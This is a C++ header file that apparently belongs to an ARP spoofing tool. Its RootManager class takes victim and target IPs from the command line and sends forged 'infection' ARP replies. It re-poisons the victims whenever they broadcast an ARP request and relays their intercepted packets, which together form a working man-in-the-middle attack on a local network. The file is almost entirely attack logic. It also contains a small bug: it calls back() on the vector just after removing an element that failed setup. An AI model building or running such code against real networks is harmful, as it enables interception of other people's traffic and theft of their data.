#pragma once

#include <stdint.h>
#include "received_packet.h"
#include "ip.h"
#include "packet.h"

class RootManager;
class ObserveQueue;

class RootManager {
private :
    char *interface;
    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
    vector<AttackPacket> attacks;
    pcap_t *handle;
    shared_ptr<ObserveQueue> observer;
    char errbuf[PCAP_ERRBUF_SIZE];

    RootManager() {}
    RootManager(const RootManager&) = delete;
    RootManager& operator=(const RootManager&) = delete;
    ~RootManager() {}

public :
    static RootManager& getInstance() {
        static RootManager instance;
        return instance;
    }

    void init(int argc, char *argv[], pcap_t *handle) {
        int do_count = (argc - 2) / 2;
        interface = argv[1];
        this->handle = handle;
        for (int i = 0; i < do_count; i++) {
            Ip senderIp(argv[2 + i*2]);
            Ip targetIp(argv[3 + i*2]);

            attacks.push_back(AttackPacket(interface, handle, senderIp, targetIp));
            if (!attacks.back().is_ready) attacks.pop_back();
            attacks.back().set_attack_packet();
            attacks.back().send_my_packet();

            cout << "[*] Send first attack packet (" << string(senderIp) << ") (" << string(targetIp) << ")" << endl;
        }
        observer = std::make_shared<ObserveQueue>();
        receivedPacket.attach(static_pointer_cast<Observer>(observer));
    }


    void start_receive() {
        receivedPacket.receive_start(handle);
    }

    void arp_infection_packet_send(EthArpPacket& packet) {
        for (AttackPacket attack : attacks) {
            if (attack.is_broadcast_from_sender(packet)) {
                cout << "[*] Arp Broadcase packet is Detected from " << string(packet.arp_.sip()) << endl;
                attack.set_attack_packet();
                attack.send_my_packet();
                cout << "[*] Resend infected Arp Packet to " << string(packet.arp_.sip()) << endl;
                return ;
            }
        }
        cout << "[*] Unknown arp packet is detected from " << string(packet.arp_.sip()) << endl;
    }

    void relay_packet_send(vector<u_char>& packet) {
        EthHdr *ethhdr = reinterpret_cast<EthHdr *>(packet.data());
        for (AttackPacket attack : attacks) {
            if (ethhdr->smac() == attack.senderMac) {
                cout << "[*] Normal Packet is detected from " << string(attack.senderIp) << endl;
                attack.relay_send(packet);
                cout << "[*] Relay Packet to " << string(attack.targetIp) << endl;
            }
        }
    }
};


class ObserveQueue : public Observer {
private:
    RootManager& rootManager = RootManager::getInstance();
    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
public:
    void update(uint16_t type) override {
        if (type == EthHdr::Arp) {
            EthArpPacket arp_packet = receivedPacket.popArp();
            if (arp_packet.isNULL()) return;
            rootManager.arp_infection_packet_send(arp_packet);
        }
        else {
            vector<u_char> packet = receivedPacket.popRelay();
            if (packet.empty()) return;
            rootManager.relay_packet_send(packet);
        }
    }
};